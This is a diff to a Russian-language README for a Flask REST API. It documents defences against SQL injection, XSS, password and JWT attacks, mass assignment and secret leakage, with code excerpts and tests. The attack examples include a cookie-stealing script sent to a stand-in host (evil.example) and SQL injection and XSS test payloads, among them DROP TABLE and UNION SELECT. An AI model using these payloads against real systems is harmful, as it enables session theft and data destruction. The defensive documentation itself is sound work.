@@ -95,6 +95,9 @@ pip-audit -r requirements.txt   # SCA
 
 JSON в ответах ниже отформатирован для читаемости. Сервер отдаёт его в одну строку, а кириллицу
 кодирует как `\uXXXX` (стандартное поведение Flask), по смыслу это тот же JSON.
+Тела запросов в примерах на латинице: curl в Windows передаёт кириллицу из `-d` в кодировке
+консоли, а не в UTF-8, и сервер получает некорректный JSON (400). Кириллицу надёжно передавать
+из файла: `--data-binary @post.json`.
 
 Вход, ответ с токеном (токен сокращён):
 
@@ -154,17 +157,17 @@ Cache-Control: no-store
 curl -s -X POST http://127.0.0.1:5000/api/posts \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
-  -d '{"title": "Привет", "body": "<b>первый</b> пост"}'
+  -d '{"title": "Hello", "body": "<b>first</b> post"}'
 ```
 
 ```json
 {
   "data": {
     "author": "alice",
-    "body": "&lt;b&gt;первый&lt;/b&gt; пост",
+    "body": "&lt;b&gt;first&lt;/b&gt; post",
     "created_at": "2026-10-01T20:21:01.217563+00:00",
     "id": 1,
-    "title": "Привет"
+    "title": "Hello"
   },
   "error": null,
   "success": true
@@ -173,34 +176,76 @@ curl -s -X POST http://127.0.0.1:5000/api/posts \
 
 ## Меры защиты
 
-### SQL-инъекции (OWASP A03 Injection)
+Для каждой меры ниже: от какой атаки она защищает, как реализована, фрагмент кода из проекта и
+каким тестом проверена. В конце раздела сводная таблица всех мер.
 
-Все запросы к БД идут через ORM SQLAlchemy, SQL из строк нигде не собирается. Значение из
-запроса попадает в драйвер SQLite связанным параметром, поэтому `' OR '1'='1' --` остаётся
-обычной строкой и сравнивается с логином целиком:
+### 1. SQL-инъекции (OWASP A03: Injection)
+
+**Атака.** Если SQL-запрос собирается склейкой строк, ввод пользователя становится частью
+команды. Уязвимый вариант для сравнения (в проекте такого кода нет):
 
 ```python
-# app/auth/users.py
+query = "SELECT * FROM users WHERE username = '" + username + "'"
+```
+
+При `username = "' OR '1'='1' --"` получится `WHERE username = '' OR '1'='1' --'`: условие
+всегда истинно, а `--` превращает остаток запроса в комментарий.
+
+**Защита.** В проекте нет ни одного SQL-запроса, собранного из строк. Все обращения к БД идут
+через ORM SQLAlchemy, а он строит **параметризованный запрос**: текст SQL с плейсхолдером `?`, а
+значения передаются драйверу SQLite отдельно. База получает значение как данные, поэтому оно
+никогда не исполняется как часть SQL.
+
+Поиск пользователя при входе (`app/auth/users.py`):
+
+```python
 def find_user(username: str) -> User | None:
     statement = db.select(User).filter_by(username=normalize_username(username))
     return db.session.execute(statement).scalar_one_or_none()
 ```
 
-SQLAlchemy превращает это в `SELECT ... FROM users WHERE users.username = ?`, значение уходит
-отдельно от текста запроса. Посты создаются так же, через `Post(title=..., body=...)` и
-`db.session.add`. В `tests/test_sqli.py` в логин подставляются `' OR '1'='1' --`, `admin'--` и
-`UNION SELECT`, в пароль `' OR '1'='1' --` и `' OR 1=1 --` (ответ 401, токена нет), а заголовок поста
-`'); DROP TABLE posts; --` сохраняется как текст, таблица остаётся на месте.
+Что на самом деле уходит в SQLite при попытке инъекции:
 
-### XSS (OWASP A03 Injection)
+```sql
+SELECT users.id, users.username, users.password_hash, users.created_at
+FROM users
+WHERE users.username = ?
+-- параметр отдельно: "' or '1'='1' --"
+```
 
-Пользовательские поля экранируются на выходе функцией `markupsafe.escape` (её же использует
-Jinja2 во Flask). В БД лежит исходный текст, а в ответе `<`, `>`, `&`, `"`, `'` заменены на
-HTML-сущности:
+База ищет пользователя с логином буквально `' or '1'='1' --`, не находит его, и вход
+отклоняется. Посты создаются так же, через объект модели, без SQL в коде (`app/api/routes.py`):
 
 ```python
-# app/api/serializers.py
+post = Post(title=data.title, body=data.body, author=current_user())
+db.session.add(post)
+db.session.commit()
+```
+
+Из этого SQLAlchemy строит `INSERT INTO posts (title, body, author_id, created_at) VALUES (?, ?, ?, ?)`.
+
+**Проверка** (`tests/test_sqli.py`). В логин подставляются `' OR '1'='1' --`, `admin'--`,
+`alice'--` и `' UNION SELECT id, username, password_hash FROM users --`, в пароль
+`' OR '1'='1' --` и `' OR 1=1 --`: везде ответ 401 и токена нет. Пост с заголовком
+`'); DROP TABLE posts; --` сохраняется в БД как обычный текст, таблицы `posts` и `users` на месте.
+
+### 2. XSS (OWASP A03: Injection)
+
+**Атака.** Пользователь сохраняет в пост HTML с JavaScript, например
+`<script>fetch('https://evil.example/?c=' + document.cookie)</script>`. Если клиентское
+приложение вставит ответ API в страницу как HTML, скрипт выполнится в браузере каждого, кто
+откроет пост (хранимая XSS), и сможет украсть сессию или действовать от имени жертвы.
+
+**Защита 1: экранирование на выходе.** Все поля с пользовательским текстом (`title`, `body`,
+`author`) перед отправкой проходят через `markupsafe.escape`. Это та же функция, которой Jinja2
+экранирует шаблоны во Flask. Код (`app/api/serializers.py`):
+
+```python
+from markupsafe import escape
+
+
 def post_to_dict(post: Post) -> dict[str, Any]:
+    # Экранируем на выходе, а не на входе: в БД лежит исходный текст
     return {
         "id": post.id,
         "title": _escape_html(post.title),
@@ -214,50 +259,370 @@ def _escape_html(text: str) -> str:
     return str(escape(text))
 ```
 
-Если клиент вставит ответ в страницу, `<script>alert(1)</script>` покажется как текст и не
-выполнится. Вторая линия защиты: заголовки `Content-Security-Policy: default-src 'none'` и
-`X-Content-Type-Options: nosniff`, чтобы браузер не исполнил JSON-ответ как HTML или скрипт.
-Тесты: `tests/test_xss.py`.
+`escape` заменяет пять символов, с которых начинается любой HTML-код:
 
-### Аутентификация (OWASP A07, A02, A01)
+| Было | Стало |
+|---|---|
+| `<` | `&lt;` |
+| `>` | `&gt;` |
+| `&` | `&amp;` |
+| `"` | `&#34;` |
+| `'` | `&#39;` |
 
-Пароли хранятся только как хэш bcrypt (12 раундов, случайная соль внутри хэша). Пользователь
-создаётся командой `flask create-user`, пароль вводится скрыто и в открытом виде нигде не
-сохраняется.
+Пример: на вход `{"title": "<script>alert(1)</script>"}`, в ответе
+`"title": "&lt;script&gt;alert(1)&lt;/script&gt;"`. Браузер покажет это как текст и не выполнит.
 
-Как проходит вход и запрос к защищённому эндпоинту:
+Почему на выходе, а не при записи: в БД остаются исходные данные. Правильное экранирование
+зависит от того, куда данные выводятся (HTML, JSON, CSV). Если экранировать при записи, текст
+испортится при повторном экранировании или при выводе в другом формате.
 
-1. `POST /auth/login`: pydantic проверяет тело (только `username` и `password`, только строки).
-   Flask-Limiter пропускает не больше 5 попыток в минуту с одного IP.
-2. Пользователь ищется в БД, пароль сверяется через `bcrypt.checkpw`. Если логина нет, пароль
-   всё равно сверяется с хэшем-заглушкой: время ответа одинаковое, и по нему не понять,
-   существует ли логин. Ответ на неверный логин и неверный пароль тоже одинаковый.
-3. При успехе выдаётся JWT, подписанный HS256 секретом `JWT_SECRET` из окружения. В токене
-   `sub` (id пользователя), `iss` (`secure-rest-api`), `iat` и `exp` (через 15 минут).
-4. Клиент передаёт токен в заголовке `Authorization: Bearer <token>`.
-5. Декоратор `jwt_required` на каждом маршруте `/api/*` достаёт токен и проверяет подпись,
-   алгоритм (только HS256, токен с `alg: none` отклоняется), срок, издателя и наличие всех
-   claims. Затем находит пользователя в БД: токен удалённого пользователя не действует.
-6. Любая ошибка проверки даёт 401 с `WWW-Authenticate: Bearer realm="api"`. При успехе
-   пользователь кладётся в `g.current_user`, автор поста берётся оттуда, а не из тела запроса.
+**Защита 2: заголовки ответа.** Даже если ответ API откроют прямо в браузере, ничего не
+выполнится. Заголовки добавляются ко всем ответам, включая ошибки (`app/security.py`):
 
 ```python
-# app/auth/tokens.py
+SECURITY_HEADERS: dict[str, str] = {
+    "X-Content-Type-Options": "nosniff",
+    "Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
+    "X-Frame-Options": "DENY",
+    "Referrer-Policy": "no-referrer",
+    "Cache-Control": "no-store",
+}
+
+
+def register_security_headers(app: Flask) -> None:
+    app.after_request(add_security_headers)
+```
+
+- `Content-Security-Policy: default-src 'none'` запрещает браузеру выполнять скрипты и загружать
+  любые ресурсы в контексте этого ответа;
+- `X-Content-Type-Options: nosniff` запрещает браузеру угадывать тип содержимого: JSON не будет
+  интерпретирован как HTML;
+- `X-Frame-Options: DENY` и `frame-ancestors 'none'` запрещают встраивать ответ в чужую страницу
+  (защита от кликджекинга);
+- `Referrer-Policy: no-referrer` и `Cache-Control: no-store` не дают утечь адресу и закэшироваться
+  личным данным.
+
+**Проверка** (`tests/test_xss.py`). `<script>alert(1)</script>` и
+`"><img src=x onerror=alert(1)>` при создании поста и при чтении списка возвращаются
+экранированными, в сыром теле ответа нет подстрок `<script` и `<img`, а в БД лежит исходный
+текст. `tests/test_security_headers.py` проверяет заголовки на успешных ответах и на ошибках.
+
+### 3. Аутентификация (OWASP A07: Identification and Authentication Failures, A02)
+
+Общая схема:
+
+```
+POST /auth/login {"username", "password"}
+  -> не больше 5 попыток в минуту с IP -> проверка тела запроса -> поиск пользователя
+  -> сверка пароля с хэшем bcrypt -> выдача JWT (HS256, 15 минут)
+
+GET /api/data, заголовок Authorization: Bearer <JWT>
+  -> декоратор jwt_required: подпись, алгоритм, срок, издатель
+  -> пользователь существует в БД -> эндпоинт выполняется
+```
+
+#### 3.1. Хранение паролей: bcrypt
+
+**Атака.** Если пароли лежат в БД открытым текстом или как быстрый хэш (MD5, SHA-256), при
+утечке базы их получают сразу или перебирают на видеокарте со скоростью миллиарды вариантов в
+секунду. Одинаковые пароли дают одинаковые хэши, и их находят по готовым таблицам.
+
+**Защита.** В БД хранится только хэш bcrypt (`app/auth/passwords.py`):
+
+```python
+BCRYPT_ROUNDS = 12
+# bcrypt учитывает только первые 72 байта пароля, более длинные отклоняем явно
+BCRYPT_MAX_PASSWORD_BYTES = 72
+
+
+def hash_password(password: str) -> str:
+    encoded = password.encode("utf-8")
+    if len(encoded) > BCRYPT_MAX_PASSWORD_BYTES:
+        raise PasswordTooLongError(
+            f"Пароль не должен превышать {BCRYPT_MAX_PASSWORD_BYTES} байт в UTF-8"
+        )
+    return bcrypt.hashpw(encoded, bcrypt.gensalt(rounds=BCRYPT_ROUNDS)).decode("ascii")
+
+
+def verify_password(password: str, password_hash: str) -> bool:
+    encoded = password.encode("utf-8")
+    if len(encoded) > BCRYPT_MAX_PASSWORD_BYTES:
+        return False
+    return bcrypt.checkpw(encoded, password_hash.encode("ascii"))
+```
+
+- **12 раундов** означают 2^12 итераций внутри bcrypt. Один хэш считается заметное время, для
+  пользователя это незаметно, а перебор становится в тысячи раз дороже. Число раундов можно
+  поднимать по мере роста мощности железа.
+- **Соль** (`bcrypt.gensalt`) случайная для каждого пароля и хранится внутри хэша: в БД лежит
+  строка вида `$2b$12$<соль><хэш>`. Одинаковые пароли дают разные хэши, готовые таблицы
+  «пароль -> хэш» бесполезны.
+- **Ограничение 72 байта.** bcrypt молча отбрасывает всё, что длиннее 72 байт. Такие пароли
+  отклоняются явно, чтобы у пользователя не было ложного ощущения надёжности.
+
+В модели `User` есть только поле `password_hash`. Пользователь создаётся командой
+`flask --app wsgi create-user <логин>`, пароль вводится скрыто и с подтверждением, минимум
+12 символов.
+
+**Проверка** (`tests/test_passwords.py`): хэш начинается с `$2b$12$` и не содержит пароля,
+одинаковые пароли дают разные хэши, неверный пароль не проходит, пароль длиннее 72 байт
+отклоняется.
+
+#### 3.2. Вход: защита от перебора паролей и подбора логинов
+
+Эндпоинт входа (`app/auth/routes.py`):
+
+```python
+INVALID_CREDENTIALS = "Неверный логин или пароль"
+LOGIN_RATE_LIMIT = "5 per minute"
+
+
+@auth_bp.post("/login")
+@limiter.limit(LOGIN_RATE_LIMIT)
+def login() -> Response:
+    # ... проверка тела запроса схемой LoginRequest (см. раздел 4)
+    user = find_user(credentials.username)
+    # Пароль проверяется и для несуществующего логина, чтобы время ответа не отличалось
+    password_hash = user.password_hash if user else dummy_hash()
+    password_ok = verify_password(credentials.password, password_hash)
+    if user is None or not password_ok:
+        return error(INVALID_CREDENTIALS, 401)
+
+    issued = issue_token(
+        user.id, current_app.config["JWT_SECRET"], current_app.config["JWT_TTL_MINUTES"]
+    )
+    return success(
+        {"access_token": issued.token, "token_type": "Bearer", "expires_in": issued.expires_in}
+    )
+```
+
+- **Перебор паролей.** `@limiter.limit("5 per minute")` (Flask-Limiter) пропускает не больше
+  5 попыток входа в минуту с одного IP, дальше ответ 429. Перебор словаря становится
+  непрактичным.
+- **Одинаковый ответ.** И для несуществующего логина, и для неверного пароля возвращается один и
+  тот же 401 «Неверный логин или пароль». По тексту ответа нельзя узнать, какие логины есть в
+  системе.
+- **Одинаковое время ответа.** Сверка bcrypt занимает заметное время. Если бы для
+  несуществующего логина сервер отвечал сразу, по скорости ответа можно было бы находить
+  существующие логины (timing-атака). Поэтому для несуществующего логина пароль всё равно
+  сверяется с хэшем-заглушкой `dummy_hash()`.
+
+**Проверка**: `tests/test_login.py` (одинаковый 401 для обоих случаев, хэш пароля не попадает
+в ответ, некорректное тело даёт 400), `tests/test_rate_limit.py` (шестая попытка за минуту
+получает 429, лимит не мешает другим эндпоинтам).
+
+#### 3.3. Выдача JWT
+
+После успешного входа выдаётся JWT (`app/auth/tokens.py`):
+
+```python
+JWT_ALGORITHM = "HS256"
+JWT_ISSUER = "secure-rest-api"
+
+
+def issue_token(
+    user_id: int, secret: str, ttl_minutes: int, now: datetime | None = None
+) -> IssuedToken:
+    issued_at = now or datetime.now(UTC)
+    payload = {
+        "sub": str(user_id),  # кому выдан
+        "iss": JWT_ISSUER,  # кто выдал
+        "iat": issued_at,  # когда выдан
+        "exp": issued_at + timedelta(minutes=ttl_minutes),  # когда истекает
+    }
+    token = jwt.encode(payload, secret, algorithm=JWT_ALGORITHM)
+    return IssuedToken(token=token, expires_in=ttl_minutes * 60)
+```
+
+Токен состоит из трёх частей в Base64URL через точку: `заголовок.payload.подпись`. Подпись это
+HMAC-SHA256 от заголовка и payload на секрете `JWT_SECRET`, который знает только сервер.
+Расшифрованный payload реального токена:
+
+```json
+{"sub": "1", "iss": "secure-rest-api", "iat": 1791814783, "exp": 1791815683}
+```
+
+Payload не шифруется, его может прочитать кто угодно, поэтому в нём только id пользователя и
+служебные поля. Изменить его нельзя: подпись перестанет сходиться, а посчитать новую без
+секрета невозможно. Срок жизни 15 минут ограничивает ущерб, если токен украдут.
+
+Секрет берётся из переменной окружения и генерируется случайно (см. раздел 6).
+
+#### 3.4. Проверка JWT на защищённых эндпоинтах
+
+Каждый маршрут `/api/*` закрыт декоратором `jwt_required` (`app/api/routes.py`):
+
+```python
+@api_bp.get("/data")
+@jwt_required
+def list_posts() -> Response: ...
+```
+
+Декоратор выполняется до кода эндпоинта (`app/auth/decorators.py`):
+
+```python
+@wraps(view)
+def wrapper(*args: P.args, **kwargs: P.kwargs) -> ResponseReturnValue:
+    token = _bearer_token(request.headers.get("Authorization", ""))
+    if token is None:
+        return error(MISSING_AUTH_MESSAGE, 401, BEARER_CHALLENGE)
+    try:
+        user_id = decode_token(token, current_app.config["JWT_SECRET"])
+    except TokenError:
+        return error(INVALID_AUTH_MESSAGE, 401, BEARER_CHALLENGE)
+
+    # Пользователь мог быть удалён после выдачи токена
+    user = db.session.get(User, user_id)
+    if user is None:
+        return error(INVALID_AUTH_MESSAGE, 401, BEARER_CHALLENGE)
+
+    g.current_user = user
+    return view(*args, **kwargs)
+```
+
+Сама проверка токена (`app/auth/tokens.py`):
+
+```python
 payload = jwt.decode(
     token,
     secret,
-    algorithms=[JWT_ALGORITHM],  # "HS256", алгоритм из заголовка токена не используется
+    algorithms=[JWT_ALGORITHM],  # только HS256, алгоритм из заголовка токена не используется
     issuer=JWT_ISSUER,
-    options={"require": REQUIRED_CLAIMS},  # sub, iss, iat, exp
+    options={"require": REQUIRED_CLAIMS},  # sub, iss, iat, exp обязательны
 )
 ```
 
-Проверка JWT сделана декоратором `jwt_required`, а не глобальным middleware: публичные маршруты
-(`/health`, `/auth/login`) должны оставаться без проверки, а декоратор виден прямо на маршруте.
-Риск забыть декоратор закрыт тестом `tests/test_api_auth_coverage.py`: он обходит все
-зарегистрированные маршруты `/api/*` и требует 401 без токена.
+Что проверяется по порядку:
 
-### Все меры
+1. Заголовок `Authorization` есть и имеет вид `Bearer <token>`.
+2. Подпись верна для секрета сервера: токен не подделан и не изменён.
+3. Алгоритм строго HS256. Список алгоритмов задан в коде, а не берётся из токена. Поэтому не
+   проходит известная атака, когда в заголовке токена пишут `"alg": "none"` («токен без
+   подписи») и уязвимая библиотека принимает его без проверки.
+4. Срок `exp` не истёк.
+5. Издатель `iss` равен `secure-rest-api`.
+6. Все claims `sub`, `iss`, `iat`, `exp` на месте.
+7. Пользователь из `sub` существует в БД: токен удалённого пользователя не действует.
+
+Любая ошибка даёт 401 с заголовком `WWW-Authenticate: Bearer realm="api"` (так требует
+RFC 6750). Клиенту не сообщается, что именно не так с токеном. При успехе пользователь кладётся
+в `g.current_user`, и эндпоинт берёт автора поста оттуда, а не из тела запроса.
+
+**Почему декоратор, а не middleware.** Глобальный middleware проверял бы все запросы подряд, а
+`/health` и `/auth/login` должны оставаться открытыми, иначе нельзя даже войти. Декоратор
+ставится на конкретный маршрут и виден прямо в коде эндпоинта.
+
+**Проверка**: `tests/test_tokens.py` (токен с чужим секретом, просроченный, с изменённым
+payload, с `alg: none`, с чужим издателем, без `exp`, мусор вместо токена: всё отклоняется),
+`tests/test_jwt_required.py` (нет заголовка, неверный формат, токен удалённого пользователя).
+
+#### 3.5. Ни один эндпоинт `/api/*` не остался без защиты (OWASP A01: Broken Access Control)
+
+Риск декоратора в том, что его можно забыть на новом эндпоинте. Это закрыто тестом
+(`tests/test_api_auth_coverage.py`): он обходит все зарегистрированные маршруты `/api/*`, шлёт
+на каждый запрос без токена и требует 401.
+
+```python
+def _unprotected_endpoints(app: Flask, client: FlaskClient) -> list[str]:
+    """Маршруты /api/*, которые без токена отвечают не 401."""
+    return [
+        f"{method} {path}"
+        for path, method in _api_endpoints(app)
+        if client.open(path, method=method).status_code != 401
+    ]
+
+
+def test_every_api_endpoint_requires_token(app: Flask, client: FlaskClient) -> None:
+    assert _unprotected_endpoints(app, client) == []
+```
+
+Если убрать `@jwt_required` с `list_posts`, тест падает с сообщением
+`assert ['GET /api/data'] == []`, и CI не пропускает такой код.
+
+### 4. Проверка входных данных и mass assignment (OWASP A03, A08)
+
+**Атака.** Клиент присылает лишние поля, например `"author": "admin"`, чтобы написать пост от
+чужого имени (mass assignment). Или неожиданные типы и огромные строки, чтобы сломать логику.
+
+**Защита.** Тело каждого запроса проверяется схемой pydantic (`app/api/schemas.py`,
+`app/auth/schemas.py`):
+
+```python
+class CreatePostRequest(BaseModel):
+    # strict: без неявных приведений типов; forbid: автора и прочие поля задать нельзя
+    model_config = ConfigDict(strict=True, extra="forbid", frozen=True)
+
+    title: str = Field(min_length=1, max_length=POST_TITLE_MAX_LENGTH)
+    body: str = Field(min_length=1, max_length=POST_BODY_MAX_LENGTH)
+```
+
+- `extra="forbid"`: лишние поля (`author`, `role`, `id`) дают 400, а не молча игнорируются;
+- `strict=True`: число вместо строки даёт 400, а не превращается в строку;
+- ограничения длины: `title` от 1 до 120 символов, `body` от 1 до 5000, `username` до 64,
+  `password` до 128;
+- автор поста всегда берётся из токена (`author=current_user()`), в схеме такого поля нет.
+
+Дополнительно тело запроса больше 16 КБ отклоняется с 413 ещё до разбора JSON
+(`MAX_CONTENT_LENGTH = 16 * 1024` в `app/__init__.py`).
+
+**Проверка**: `tests/test_api_posts.py` и `tests/test_login.py` (лишние поля, неверные типы,
+пустые и слишком длинные строки, не JSON, слишком большое тело).
+
+### 5. Ошибки без утечки деталей (OWASP A04, CWE-209)
+
+**Атака.** Трейсбек в ответе показывает злоумышленнику пути к файлам, версии библиотек и
+фрагменты кода.
+
+**Защита.** Все ошибки отдаются в общем JSON-конверте. Необработанное исключение пишется в лог
+сервера целиком, а клиент получает только общий текст (`app/errors.py`):
+
+```python
+def handle_unexpected_error(exc: Exception) -> Response | HTTPException:
+    """Необработанное исключение: подробности только в лог, клиенту общий текст."""
+    if isinstance(exc, HTTPException):
+        return exc
+    current_app.logger.exception("Необработанное исключение")
+    return error(INTERNAL_ERROR_MESSAGE, INTERNAL_SERVER_ERROR)
+```
+
+**Проверка**: `tests/test_errors.py`.
+
+### 6. Секреты и конфигурация (OWASP A02, A07)
+
+**Атака.** Секрет подписи JWT в коде или в git означает, что любой, кто видел репозиторий, может
+выпускать токены от имени любого пользователя. Слабый секрет можно подобрать перебором.
+
+**Защита.** Секреты читаются только из переменных окружения (файл `.env`, он в `.gitignore`).
+Настройки проверяются при старте (`app/config.py`):
+
+```python
+MIN_JWT_SECRET_LENGTH = 32
+
+
+@dataclass(frozen=True)
+class Settings:
+    database_url: str
+    jwt_secret: str = field(repr=False)  # секрет не попадёт в логи через repr
+    jwt_ttl_minutes: int = DEFAULT_JWT_TTL_MINUTES
+    rate_limit_enabled: bool = True
+
+    def __post_init__(self) -> None:
+        if len(self.jwt_secret) < MIN_JWT_SECRET_LENGTH:
+            raise ConfigError(
+                f"JWT_SECRET должен быть задан и содержать не менее "
+                f"{MIN_JWT_SECRET_LENGTH} символов"
+            )
+```
+
+Стойкость секрета даёт случайная генерация: `secrets.token_urlsafe(48)` (48 случайных байт,
+384 бита энтропии при минимуме 256 бит для HS256 по RFC 7518). Проверка длины только отсекает
+пустые и короткие значения: длинный, но неслучайный секрет вроде `"a" * 32` она пропустит,
+поэтому секрет нужно генерировать командой из раздела «Локальный запуск».
+
+**Проверка**: `tests/test_config.py` (короткий или пустой секрет не даёт запустить приложение,
+секрета нет в `repr` настроек).
+
+### Сводная таблица
 
 | Угроза | OWASP Top 10 2021 | Мера | Где в коде | Тесты |
 |---|---|---|---|---|
